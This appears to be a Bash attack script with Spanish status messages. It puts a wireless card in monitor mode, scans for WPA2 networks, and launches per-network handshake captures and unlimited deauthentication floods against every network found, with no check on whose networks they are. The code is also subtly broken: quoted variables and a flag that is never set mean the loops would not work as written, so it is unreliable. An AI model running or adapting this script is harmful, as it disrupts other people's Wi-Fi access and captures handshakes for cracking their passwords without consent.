#!/bin/bash

declare -A network_info
declare -g new_values_available=0

function wlan0monitor() {
    echo 'Cambiando monitor mode'
    sudo ifconfig wlan0 down
    sleep .8
    sudo iwconfig wlan0 mode monitor
    sleep .8
    sudo ifconfig wlan0 up
    sleep .8
    echo 'wlan0 en modo monitor'
    startadump
}

function startadump() {
    echo 'iniciando escaneo'
    airodump-ng -w redes/redes wlan0 > /dev/null &
    airodump_pid=$!
    sleep 10
    kill $airodump_pid
    recuperaredes
}

function recuperaredes() {
    lines=$(wc -l 'redes/redes-01.csv' | awk '{print $1}')
    numline=$((lines))

    while IFS=',' read -r mac _ _ chan _ cryp _ _ _ _ _ _ _ key; do
        mac=$(echo '$mac' | xargs)
        chan=$(echo '$chan' | xargs)
        cryp=$(echo '$cryp' | xargs)
        key=$(echo '$key' | xargs)

        if [[ "$mac" != "BSSID" && "$cryp" == "WPA2" ]]; then
            if [ "$key" == "," ]; then
                key=$mac
            fi
            if [[ "${key: -1}" == "," ]]; then
                key="${key%,}"
            fi

            network_info["$mac,$chan,$cryp,$key"]=1
        fi
        numline=$((numline-1))
    done < redes/redes-01.csv

    for info in "${!network_info[@]}"; do
        beacon "$info" &
        deauth "$info" &
    done

    # Wait for both beacon and deauth to finish
    wait
}

function beacon() {
    local info
    while true; do
        if [ "$new_values_available" -eq 1 ]; then
            info=$1
            IFS=',' read -r mac chan cryp key <<< "$info"

            # Kill the previous airodump-ng process if it's running
            sudo pkill -f "airodump-ng -w caps/$key"

            # Start a new airodump-ng process
            xterm -e "sudo airodump-ng -w caps/$key -c $chan --bssid $mac wlan0 | tee -a beacon_output.txt"

            # Reset the flag to indicate that we're using the current values
            new_values_available=0
        fi
        sleep 1
    done
}

function deauth() {
    local info
    while true; do
        if [ "$new_values_available" -eq 1 ]; then
            info=$1
            IFS=',' read -r mac _ _ _ <<< "$info"

            # Perform deauth attacks here
            sudo aireplay-ng --deauth 0 -a $mac wlan0

            # Reset the flag to indicate that we're using the current values
            new_values_available=0
        fi
        sleep 1
    done
}

wlan0monitor
